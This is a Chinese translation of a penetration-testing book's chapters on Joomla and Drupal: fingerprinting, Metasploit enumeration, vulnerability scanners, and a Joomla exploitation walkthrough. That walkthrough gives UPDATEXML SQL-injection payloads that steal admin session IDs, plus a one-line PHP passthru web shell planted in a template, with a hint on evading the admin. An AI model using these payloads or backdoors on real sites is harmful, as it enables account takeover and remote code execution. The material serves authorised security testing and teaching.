# Metasploit Web 渗透测试实用指南（三）

> 原文：[`annas-archive.org/md5/53B22D5EEA1E9D6C0B08A2FDA60AB7A5`](https://annas-archive.org/md5/53B22D5EEA1E9D6C0B08A2FDA60AB7A5)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十二章：渗透测试 CMS - Joomla

在上一章中，我们学习了如何对 WordPress 进行**渗透测试**（**pentesting**）。就像 WordPress 一样，还有另一个被组织广泛使用来管理其网站门户的**内容管理系统**（**CMS**）- Joomla。在本章中，我们将学习 Joomla，其架构以及可用于测试基于 Joomla 的网站安全性的模块。以下是本章将涵盖的主题：

+   Joomla 简介

+   Joomla 架构

+   侦察和枚举

+   使用 Metasploit 枚举 Joomla 插件和模块

+   使用 Joomla 进行漏洞扫描

+   使用 Metasploit 进行 Joomla 利用

+   Joomla shell 上传

# 技术要求

以下是本章的技术先决条件：

+   Metasploit 框架（[`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework)）

+   Joomla CMS（[`www.joomla.org/`](https://www.joomla.org/)）

+   已安装的数据库；推荐使用 MySQL（[`www.mysql.com/`](https://www.mysql.com/)）

+   对 Linux 命令的基本了解

# Joomla 简介

Joomla 是一个由 Open Source Matters，Inc.创建的免费开源 CMS，用于发布 Web 内容。它基于**模型-视图-控制器**（**MVC**）Web 应用程序框架，可以独立于 CMS 使用。 Joomla 成立于 2005 年 8 月 17 日，是 Mambo 分支的结果。

Joomla 有成千上万的扩展和模板，其中许多是免费提供的。 Joomla 的一些功能包括以下内容：

+   它是多语言的。

+   它提供开箱即用的**搜索引擎优化**（**SEO**）并且是**搜索引擎友好**（**SEF**）的。

+   它是免费使用的，遵循**通用公共许可证**（**GPL**）。

+   它具有访问控制列表，允许您管理网站的用户以及不同的用户组。

+   它具有菜单管理，因此可以创建尽可能多的菜单和菜单项。

现在我们已经简要介绍了 Joomla，让我们看看它的架构，以深入了解软件。

# Joomla 架构

Joomla 的架构基于 MVC 框架。我们可以将架构分为四个主要部分：

+   **显示**：这是用户访问网站时看到的前端。它包含 HTML 和 CSS 文件。

+   **扩展**：扩展可以进一步分为五种主要类型：

+   **组件**：组件可以被视为迷你应用程序；它们既适用于用户也适用于管理员。

+   **模块**：这些是可以用于呈现页面的小型灵活扩展。一个例子是登录模块。

+   **插件**：这些是更高级的扩展，也被称为事件处理程序。这些事件可以从任何地方触发，并执行与该事件相关联的插件。

+   **模板**：模板负责网站的外观。有两种类型的模板—前端和后端。后端模板由管理员用于监视功能，而前端模板向访问者/用户呈现网站。

+   **语言**：这些处理网站文本的翻译。 Joomla 支持 70 多种语言。

+   **框架**：框架由 Joomla 核心组成。这些是负责应用程序的主要功能的 PHP 文件，例如配置文件。

+   **数据库**：数据库存储用户信息，内容等。 Joomla 支持 MySQL，**Microsoft Server SQL**（**MSSQL**）和 PostgreSQL 等。

# 文件和目录结构

Joomla 中的目录名称非常简单。我们可以通过查看其名称来猜测目录的内容。 Joomla 文件和目录具有以下结构：

+   `根`：这是我们提取 Joomla 源代码的地方。它包含一个执行安装过程的索引文件。

+   `管理员`：此文件夹包含 Joomla 管理员界面的所有文件（组件、模板、模块、插件等）。

+   `缓存`：此文件夹包含 Joomla 缓存的文件，以增加 CMS 的性能和效率。

+   `组件`：此文件夹包含所有用户组件（不包括管理员），包括登录和搜索。

+   `图像`：此目录包含 Joomla 界面使用的所有图像，以及用户上传的图像。

+   `包含`：此目录包含核心 Joomla 文件。

+   `安装`：此文件夹包含安装 Joomla 所需的文件。安装后应删除它。

+   `语言`：此文件夹包含所有语言文件。Joomla 以简单的 INI 格式文件存储翻译。

+   `库`：此文件夹包含整个核心库，以及 Joomla 的第三方库。它包含描述文件系统、数据库等的文件。

+   `日志`：此文件夹包含应用程序日志。

+   `媒体`：此目录存储所有媒体文件，如 Flash 和视频。

+   `模块`：模块放置在 Joomla 模板中，如面板。此文件夹包含所有前端模块的文件。一些常见的模块包括登录、新闻和投票。

+   `插件`：此文件夹包含所有插件文件。

+   `模板`：此文件夹包含所有前端模板文件。每个模板都按名称组织在文件夹中。

+   `Tmp`：此文件夹存储管理员和用户界面使用的临时文件和 cookie。

我们现在已经了解了 Joomla 的架构。接下来，我们将看一下侦察和枚举。

# 侦察和枚举

在使用 Joomla 之前，要执行的第一步是确认 Web 应用程序是否由其提供动力。有各种方法可以检测 CMS 的安装，其中一些列在这里：

+   通过搜索`<meta name="generator" content="Joomla! - Open Source Content Management" />`

+   通过探索`X-Meta-Generator HTTP`标头

+   通过检查`RSS/atom feeds: index.php?format=feed&type=rss/atom`

+   通过 Google Dorks：`inurl:"index.php?option=com_users`

+   通过查找`X-Content-Encoded-By: Joomla`标头

+   通过查找`joomla.svg/k2.png/SOBI 2.png/SobiPro.png/VirtueMart.png`

接下来，让我们找出安装了哪个版本的 Joomla。

# 版本检测

现在我们已经对 Joomla 有了足够的了解，我们可以开始 CMS 渗透测试（我们在上一章中学到了，第八章，*Pentesting a CMS – WordPress*）。渗透测试 Joomla CMS 的第一步是找出目标服务器上安装的版本。以下是我们可以检测安装了哪个版本的方法：

+   通过元标记进行检测

+   通过服务器标头进行检测

+   通过语言配置进行检测

+   通过`README.txt`进行检测

+   通过`manifest`文件进行检测

+   通过唯一关键字进行检测

# 通过元标记进行检测

`generator`元标记通常被描述为用于生成文档或网页的软件。确切的版本号在元标记的`content`属性中披露：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/82ef2e82-24d6-4cd3-9a27-74f670398713.png)

基于 Joomla 的网站通常在其源代码中具有此标记，如前面的屏幕截图所示。

# 通过服务器标头进行检测

Joomla 的版本号经常在托管应用程序的服务器的响应标头中披露。版本可以在`X-Content-Encoded-By`标头中披露，如下面的屏幕截图所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e3ee649c-071d-4f66-ad7b-ce5974b1332a.png)

接下来，我们将通过语言配置来进行检测。

# 通过语言配置进行检测

Joomla 支持 70 多种语言。每种语言包都有一个 XML 文件，其中披露了版本信息，如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b38d2ea2-3445-401a-87b8-f27f8df1dba8.png)

可以通过`/language/<language-type>/<language-type>.xml`页面访问此页面。在这种情况下，我们搜索了英国英语（`en-GB`）格式。

# 通过 README.txt 检测

这是最简单和最基本的技术。我们所要做的就是访问`README.txt`页面，我们将看到版本号，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/84a276d9-a0a7-4831-a9ff-950000598200.png)

该文件包含有关 Joomla 首次用户的各种信息。

# 通过清单文件检测

Joomla 的`manifest`文件位于`/administrator/manifests/files/joomla.xml`，包含了有关服务器上安装的 CMS 的基本信息，以及正在运行的模块、版本号、安装日期等。这也是查找正在运行的 CMS 版本号的好地方：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ec64c9e9-b139-4460-8e4c-f04559707ac7.png)

上述截图显示了包含版本号的`manifest`文件。

# 通过唯一关键字检测

确定 Web 服务器上运行的 Joomla 版本的另一种方法是在以下文件中查找特定关键字。这些关键字是特定于版本的，其中一些在此代码块后面的表中列出：

```
administrator/manifests/files/joomla.xml
language/en-GB/en-GB.xml
templates/system/css/system.css
media/system/js/mootools-more.jsh
taccess.txt
language/en-GB/en-GB.com_media.ini
```

根据其 Joomla 版本的唯一关键字详细信息如下：

| **Joomla 版本** | **唯一关键字** |
| --- | --- |
| 版本 2.5 | `MooTools.More={version:"1.4.0.1"}` |
| 版本 1.7 | `21322 2011-05-11 01:10:29Z dextercowley``22183 2011-09-30 09:04:32Z infograf768``21660 2011-06-23 13:25:32Z infograf768``MooTools.More={version:"1.3.2.1"}` |
| 版本 1.6 | `20196 2011-01-09 02:40:25Z ian``20990 2011-03-18 16:42:30Z infograf768``MooTools.More={version:"1.3.0.1"}` |
| 版本 1.5 | `MooTools={version:'1.12'}``11391 2009-01-04 13:35:50Z ian` |
| 版本 1.0 | `47 2005-09-15 02:55:27Z rhuk``423 2005-10-09 18:23:50Z stingrey``1005 2005-11-13 17:33:59Z stingrey``1570 2005-12-29 05:53:33Z eddieajau``2368 2006-02-14 17:40:02Z stingrey``4085 2006-06-21 16:03:54Z stingrey``4756 2006-08-25 16:07:11Z stingrey``5973 2006-12-11 01:26:33Z robs``5975 2006-12-11 01:26:33Z robs` |

以下截图显示了`en-GB.ini`文件中的一个关键字，这意味着版本是 1.6：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6bff5130-8203-495b-9ba7-82f577678c0b.png)

在下一节中，我们将看看如何使用 Metasploit 对 Joomla 进行侦察。

# 使用 Metasploit 进行 Joomla 侦察

现在我们已经了解了检测基于 Joomla 的目标的不同方法，我们可以使用 Metasploit 框架已经提供的 Metasploit 模块进行侦察。我们将使用的第一个模块是`joomla_version`模块。我们可以使用`use auxiliary/scanner/http/joomla_version`命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/60685918-9370-456c-9dc2-5ddebea2de7e.png)

设置模块所需的所有信息（即 RHOSTS 和 RPORT）后，我们可以使用`run`命令执行模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6460087b-34ed-4416-bed3-c71a480711fb.png)

该模块将通过我们在*版本检测*部分中介绍的不同方法返回运行在目标实例上的 Joomla 版本。在下一节中，我们将学习如何使用 Metasploit 枚举 Joomla 插件和模块。

# 使用 Metasploit 枚举 Joomla 插件和模块

我们还可以使用 Metasploit 的内置辅助工具来进行 Joomla 的枚举。以下是在 Metasploit 中可用的用于枚举 Joomla 的类别：

+   页面枚举

+   插件枚举

# 页面枚举

第一个是**页面枚举**。这个辅助程序扫描 Joomla 中存在的常见页面，如`readme`和`robots.txt`。

要使用辅助工具，我们使用以下命令：

```
use auxiliary/scanner/http/joomla_pages
```

然后，我们使用`show options`命令查看各种模块选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e3c98ba2-b630-4430-887a-e57582d667e4.png)

我们设置`RHOSTS`和`RPORT`并运行模块。模块完成后，发现的页面将被打印出来，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f939e755-910b-4602-a7b3-7efb23577547.png)

下一步是使用另一个 Metasploit 模块枚举 Joomla 插件。

# 插件枚举

Metasploit 的另一个辅助工具，可用于枚举插件的是`joomla_plugins`。该辅助工具使用一个单词列表来查找目录路径，以检测 Joomla 使用的各种插件。我们可以执行以下命令来使用插件枚举模块：

```
use auxiliary/scanner/http/joomla_plugins
```

以下屏幕截图显示了前述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1b689ce7-db23-49cd-9092-905bec42526b.png)

`show options`的输出如前面的屏幕截图所示。一旦执行了模块，脚本将返回它发现的插件的名称，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/78a520b0-7398-4a09-af7f-0ace7b588f47.png)

默认情况下，辅助工具使用[`github.com/rapid7/metasploit-framework/blob/master/data/wordlists/joomla.txt`](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/joomla.txt)上的单词列表；我们也可以使用自定义单词列表。在下一节中，我们将使用 Joomla 进行漏洞扫描。

# 使用 Joomla 进行漏洞扫描

Metasploit 目前还没有内置的 Joomla 特定漏洞评估模块。这给我们两个选择；要么像我们在上一章中为 WordPress 所做的那样，为 Joomla 自己制作一个包装器或插件，要么使用已经在线可用的不同工具，如 JoomScan 或 JoomlaVS。在本节中，我们将看一个可以用于执行 Joomla 漏洞评估的优秀工具。

官方 Joomla GitHub 维基页面上包括以下描述：

JoomlaVS 是一个 Ruby 应用程序，可以帮助自动评估 Joomla 安装对利用的脆弱性。它支持基本的指纹识别，并且可以扫描组件、模块和模板中存在的漏洞，以及 Joomla 本身存在的漏洞。

JoomlaVS 可以从以下网址下载：[`github.com/rastating/joomlavs`](https://github.com/rastating/joomlavs)。

可以通过执行以下命令来运行该工具：

```
./joomlavs.rb
```

在没有任何参数的情况下运行该工具将打印`help`部分，如下面的屏幕截图所示。该工具支持不同的扫描类型，例如仅扫描模块、模板或组件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e5bde690-ac4d-4083-9705-1f1af0e2d550.png)

要对 URL 进行所有扩展的扫描，我们可以使用以下命令：

```
./joomlavs.rb --url http://<domain here>/ -a
```

工具将开始运行，并且它发现的所有细节将打印在屏幕上，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/749ba025-2bdd-4480-a3d7-14ff526b45ee.png)

一旦我们获得了关于可用漏洞、插件和版本号的信息，我们就可以继续进行利用过程。

# 使用 Metasploit 进行 Joomla 漏洞利用

一旦所有的枚举和版本检测完成，就该进行利用了。在本节中，我们将看一些 Joomla 可以被利用的方式。第一个是在 Joomla 中应用的众所周知的 SQL 注入漏洞，以获得**远程代码执行**（**RCE**）。Metasploit 模块可用于此，我们可以通过执行`use exploit/unix/webapp/joomla_comfields_sqli_rce`命令来使用它，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d800eb99-cc46-4f88-888e-e82771c15cfd.png)

在运行利用之前，让我们看看它是如何工作的。

# 漏洞利用的原理是什么？

以下 SQL 查询被发送到服务器，返回表名前缀的 Base64 编码值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/175502cd-5b6a-477e-860a-0e6eade8e1d6.png)

这可以如下所示：

```
(UPDATEXML(2170,CONCAT(0x2e,0x#{start_h},(SELECT MID((IFNULL(CAST(TO_BASE64(table_name) AS CHAR),0x20)),1,22) FROM information_schema.tables order by update_time DESC LIMIT 1),0x#{fin_h}),4879))
```

可以在此处看到发送到 Web 服务器的请求的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/33683472-0583-44e1-821d-074d99fd1c4d.png)

网络服务器返回表名前缀的 Base64 编码值，如下所示，在`ABC`之间：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9d256823-36e9-4d9c-8fc9-284a588ff85b.png)

以下屏幕截图显示了用于转储用户会话的 SQL 查询：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/aa19bb5a-5181-4a86-baf9-140f996e7ce7.png)

如下所示：

```
(UPDATEXML(2170,CONCAT(0x2e,0x414243,(SELECT MID(session_id,1,42) FROM ntnsi_session where userid!=0 LIMIT 1),0x414243),4879))
```

请求使用`send_request_cgi()`方法发送。服务器将返回`内部服务器错误`错误（代码`500`），但我们可以使用十六进制值——换句话说，`#{start_h}`和`#{fin_h}`——作为正则表达式从输出中查找会话。以下截图显示了查找十六进制值之间会话的代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/722f98bd-9f1f-45aa-bae1-d37bebb5b1f0.png)

以下截图显示了发送到服务器以转储会话信息的 SQL 查询：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/410b4f1a-403d-4459-a341-f7ea5d58b63c.png)

以下截图显示了 Web 服务器的响应，显示了用户的会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/41f1f4b3-c48a-4d73-969c-3e77d866b616.png)

如下所示，从数据库中检索到了会话，但在我们的情况下，我们遇到了一个问题；似乎存在字符限制：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/520c75b5-e6ea-4042-8d12-3642c2ebed67.png)

查看数据库中的值，我们可以看到并没有返回所有字符，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8bc9e70e-01c8-4ab4-b180-4595f2bce4a9.png)

最后三个具有十六进制值`ABC`的字符未显示在屏幕上。为了解决这个问题，我们可以使用一个解决方法，即不使用单个查询从数据库中检索会话，而是使用`MID()`函数将会话分为两部分。

需要使用的第一个 SQL 会话负载`1`如下所示：

```
(UPDATEXML(2170,CONCAT(0x2e,0x414243,(SELECT MID(session_id,1,15) FROM ntnsi_session where userid!=0 order by time desc LIMIT 1),0x414243),4879))
```

如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c6cfd060-c8b2-466f-9284-9ebc8ca73aa8.png)

执行前述 SQL 负载`1`的结果如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/14d81c3c-c996-49d4-ae29-f0d8d387f41f.png)

现在，我们需要使用的第二个 SQL 会话负载如下：

```
(UPDATEXML(2170,CONCAT(0x2e,0x414243,(SELECT MID(session_id,16,42) FROM ntnsi_session where userid!=0 order by time desc LIMIT 1),0x414243),4879))
```

如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/35074079-65cf-465d-b0fb-39a9517c5b64.png)

执行前述 SQL 负载`2`的结果如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2c331c46-13d5-4910-99a2-242eb36e4c71.png)

现在，我们只需要将我们在前面步骤中通过执行负载`1`和`2`检索到的两个输出连接成一个。让我们将代码添加到模块中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9826aad9-f0ef-4aac-aea7-5c62a9216c64.png)

现在代码已经修改，让我们保存文件并执行模块，看看是否有效：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3c526dd4-ffc5-4a95-adfa-02a201b87b07.png)

如我们从前面的截图中所见，我们成功检索到了会话，并且使用存储在数据库中的会话，我们打开了一个 Meterpreter 会话！

# Joomla shell 上传

为了理解先前提到的漏洞中上传 shell 的位置，我们将从管理员面板手动上传一个基本的命令执行 shell。

利用后，一旦我们成功以管理员身份登录，我们可以从模板菜单中上传一个 shell。以下截图显示了 Joomla 的管理面板：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0f3daf8f-deb5-43d1-865c-03c1ef5d159f.png)

从面板菜单中，我们点击 Extensions | Templates | Templates，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/eb7f8860-6a33-4368-9547-996a7f5fe653.png)

我们被重定向到模板页面，列出了当前上传的所有模板，包括当前使用的模板。最好不要触摸当前的模板，因为这可能会引起管理员注意到变化并发现我们的代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7b30ff10-0af6-49fd-bc55-c8b4cb80fed2.png)

前面的截图显示了模板列表。我们将选择 Protostar，因此点击模板，然后将被重定向到下一页，在左侧列出了所有模板的 PHP 页面，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b1bb9f06-3347-4e52-8e4d-43f2a1dd4b3f.png)

我们点击 index.php 并向文件添加我们自定义的 PHP 一行代码。这将充当后门，并允许我们执行系统级命令：

```
<?php passthru($GET['cmd']); ?>
```

以下截图显示了索引的第一行现在有我们的后门：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/44711f34-0857-42a5-8816-3e4eab8efa0c.png)

保存更改后，我们可以在以下路径浏览我们的后门：

```
domainname.com/<joomla path>/templates/<template name>/index.php?cmd=id
```

以下截图显示我们的命令已成功执行：

[图片]

一旦我们向客户提供了概念验证，Joomla 的利用就结束了。然而，超越正常的利用方法并进入网络是需要在项目启动会议中与客户讨论的事情。作为渗透测试人员，我们必须遵守客户定义的范围。

如果上传了这样的有效负载，仅仅是为了获得概念验证，那么在利用完成后，我们有义务删除这些后门。

# 总结

在本章中，我们学习了 Joomla 的架构及其文件和目录结构。然后，我们进行了侦察过程，并了解了查找 Joomla 实例及其版本号的不同方法。我们还研究了为我们自动化这一过程的工具和脚本。最后，我们深入研究了 Joomla 利用的过程，以及利用如何使用先前发现的公开利用的示例。

在下一章中，我们将学习如何对另一个流行的 CMS——Drupal 进行渗透测试。

# 问题

1.  我可以在任何操作系统上安装 Joomla 吗？

1.  如果现有的 Metasploit 模块无法找到 Joomla 的版本，我可以自己创建 Metasploit 模块吗？

1.  Metasploit 模块无法检测安装的 Joomla 版本。还有其他检测方法吗？

1.  我成功利用 Joomla 上传漏洞上传了一个 shell。有没有可能以隐秘的方式在 CMS 中设置后门？

# 进一步阅读

+   Joomla 中易受攻击的扩展列表可以在[`vel.joomla.org/live-vel`](https://vel.joomla.org/live-vel)找到。

+   有关 Joomla 架构的更多信息可以在[`docs.joomla.org/Archived:CMS_Architecture_in_1.5_and_1.6`](https://docs.joomla.org/Archived:CMS_Architecture_in_1.5_and_1.6)找到。


# 第十三章：渗透测试 CMS - Drupal

在上一章中，我们解释了如何对 Joomla 网站进行渗透测试。WordPress、Joomla 和 Drupal 之间存在相当大的差异，特别是在安全性和架构方面。在本章中，我们将学习有关 Drupal、其架构以及如何测试基于 Drupal 的网站的内容。

在本章中，我们将涵盖以下主题：

+   Drupal 及其架构简介

+   Drupal 侦察和枚举

+   使用 droopescan 进行 Drupal 漏洞扫描

+   利用 Drupal

# 技术要求

对于本章，您将需要以下内容：

+   一些 PHP 知识

+   对 Metasploit Framework 的基础了解

+   了解基本的 Linux 命令，如`grep`和`ag`

+   对 Burp Suite 的基础了解

# Drupal 及其架构简介

Drupal 是一个用 PHP 编写的免费开源**内容管理系统**（**CMS**）。它最初是由**Dries Buytaert**作为留言板编写的，但在 2001 年成为一个开源项目。尽管与其他 CMS 相比，Drupal 被认为使用起来有点棘手，但它确实提供了内置的 API 来促进自定义模块的开发。

# Drupal 的架构

描述 Drupal 架构的一般方法是将其分为四个主要部分，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d71d78c6-8415-43a1-96b9-6626a2d3383a.png)

要了解架构，首先让我们了解 Drupal 的组件。Drupal 的组件列在这里：

+   **主题**：主题是定义 Drupal 网站用户界面的文件集合。这些文件包含用 PHP、HTML 和 JavaScript 编写的代码。

+   **模块**：模块是事件驱动的代码文件，可用于扩展 Drupal 的功能。一些模块是已知的核心模块，由 Drupal 开发团队维护，因为它们是 Drupal 运行的重要部分。

+   **核心 API**：Drupal 的核心是用于与内容和其他模块通信的 API。这些 API 包括以下内容：

+   **数据库 API**：这允许开发人员轻松更新/修改数据库中的数据。

+   **缓存 API**：此 API 存储页面响应，以便浏览器不必在每次请求时重新渲染页面。

+   **会话处理 API**：这可以跟踪网站上不同用户及其活动。

+   **数据库**：这是存储所有数据的地方。Drupal 支持不同类型的数据库，如 MySQL、Postgres 和 SQLite。

现在我们对 Drupal 的架构有了基本了解，让我们接下来看目录结构。

# 目录结构

Drupal 具有以下目录结构：

+   **核心**：这包括默认 Drupal 安装使用的文件。

+   **模块**：安装在 Drupal 中的所有自定义模块都存储在这里。

+   **配置文件**：此文件夹存储安装配置文件。安装配置文件包含有关预安装模块、主题和给定 Drupal 站点配置的信息。

+   **网站**：如果 Drupal 与多个站点一起使用，则包含特定于站点的模块。

+   **主题**：基础主题和所有其他自定义主题都存储在此目录中。

+   **供应商**：此目录包含 Drupal 使用的后端库，如 Symfony。

默认 Drupal 安装的目录结构如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d1bf7a31-cca4-4596-b2a0-156a89a49364.png)

现在我们对 Drupal 的基础知识和目录结构有了了解，让我们继续下一个主题：Drupal 侦察和枚举。

# Drupal 侦察和枚举

正如我们在前几章中所讨论的，侦察和枚举是任何渗透测试的关键步骤。在本节中，我们将看一些可用于识别 Drupal 安装和已安装版本的方法。

# 通过 README.txt 进行检测

这是最简单和最基本的技术。我们只需要访问`README.txt`页面，就会看到一行文字，上面写着“保护文件和目录免受窥视”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1abf36c4-7030-48a4-8185-c8ea7708e7cf.png)

这将表明该实例确实是 Drupal 实例。

# 通过元标记检测

具有`name`属性为`"Generator"`的元标记标识用于生成文档/网页的软件。版本号在元标记的`content`属性中公开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/49ec88ea-884d-491e-bee6-457eafafb59c.png)

基于 Drupal 的网站通常在其源代码中有这个标签。

# 通过服务器标头检测

如果服务器响应中存在以下标头之一，也可以识别 Drupal：

+   **X-Generator HTTP 标头**：这标识了 Drupal 网站。

+   **X-Drupal-Cache 标头**：这个标头由 Drupal 的缓存使用。如果标头值为**X-Drupal-Cache: MISS**，这意味着页面不是从缓存显示中提供的，如果你看到**X-Drupal-Cache: HIT**，这意味着页面是从缓存中提供的。

+   **X-Drupal-Dynamic-Cache 标头**：该动态缓存用于加载动态内容（缓存页面），但不包括个性化部分。

+   **过期：1978 年 11 月 19 日**。

以下屏幕截图显示了服务器响应中的这些标头：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7fdeff02-29d4-4706-8798-5a9a6dcc56e3.png)

Drupal 版本 8+引入了动态缓存标头`X-Drupal-Dynamic-Cache`，不适用于 Drupal 版本 7 或更早版本。

# 通过 CHANGELOG.txt 检测

有时，`CHANGELOG.txt`文件也会公开版本号。该文件可以在这里找到：

```
/CHANGELOG.txt 
/core/CHANGELOG.txt
```

我们可以浏览`/CHANGELOG.txt`或`/core/CHANGELOG.txt`来识别已安装的 Drupal 版本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/99bfdd0d-92f0-4fe8-a16b-0a58bee864d6.png)

在某些情况下，我们可能找不到`CHANGELOG.txt`文件。在这种情况下，我们可以尝试本节中提到的其他检测技术。

# 通过 install.php 检测

尽管建议在安装后删除`install.php`文件，但开发人员经常将其留在服务器上。它可以用于找到 Drupal 安装的版本号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/432fa7c9-6292-4c5a-834b-ab42cc1158fc.png)

此方法仅适用于 Drupal 版本 8.x。

这些检测技术只能确定站点是否安装了 Drupal 以及使用的版本。它不会找到 Drupal 中安装的插件、主题和模块。要识别插件、主题和模块，我们需要枚举它们。我们需要枚举插件、主题和模块，因为这些是攻击者可以利用的入口点，以控制 Drupal 站点。作为渗透测试人员，我们需要找到有漏洞的插件、主题和模块（已安装的版本）并报告它们。

# 插件、主题和模块枚举

现在几乎所有在线可用的开源工具都使用了一种非常常见的技术来枚举 Drupal 插件、主题和模块。要进行枚举，我们只需在`themes/`、`plugins/`和`modules/`目录中寻找以下文件：

```
/README.txt 
/LICENSE.txt 
/CHANGELOG.txt
```

`README.txt`文件提供了插件、主题和模块的版本。它甚至还公开了 Drupal 版本号。`LICENSE.txt`文件包括 GNU**通用公共许可证（GPL）**许可证。如果`plugins/`、`themes/`或`modules/`目录中有这个文件，这意味着特定的插件、主题或模块已安装。`CHANGELOG.txt`文件公开了已安装的插件、主题或模块的版本号。

模块名称可以从`README.txt`文件或 URL 本身中找到，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f08b6880-a5dc-459e-810f-8966663d79d9.png)

在枚举方面，我们可以编写自己的 Metasploit 包装模块，或者使用第三方开源工具 droopescan。要编写自己的包装器，我们可以按照上一章第八章中所做的进行。我们现在将继续使用 droopescan 进行漏洞扫描。

# 使用 droopescan 进行 Drupal 漏洞扫描

没有 Metasploit 模块可以对 Drupal 进行漏洞扫描。因此，我们需要使用第三方工具，如 droopescan，来帮助我们发现 Drupal 中的漏洞。droopescan 可以从[`github.com/droope/droopescan`](https://github.com/droope/droopescan)下载：

1.  让我们使用以下命令克隆 droopescan 的 Git 存储库进行安装：

```
git clone https://github.com/droope/droopescan
```

以下是先前命令的输出截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/11fd5fe7-a373-405b-ac8c-eb972a52afe8.png)

1.  在运行 droopescan 之前，我们仍然需要安装必要的 Python 模块，可以使用以下命令完成：

```
pip install -r requirements.txt
```

1.  在系统上安装了所有软件包后，我们可以通过执行以下命令来测试安装 droopescan：

```
./droopescan
```

1.  如果在执行 droopescan 时出现错误，我们也可以使用以下命令来执行它：

```
python droopescan
```

1.  安装 droopescan 后，我们可以执行以下命令对 Drupal 进行漏洞扫描：

```
./droopescan scan drupal -u <URL>
```

以下是先前命令的输出截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f166934c-7acd-40ff-9eea-7305462df76c.png)

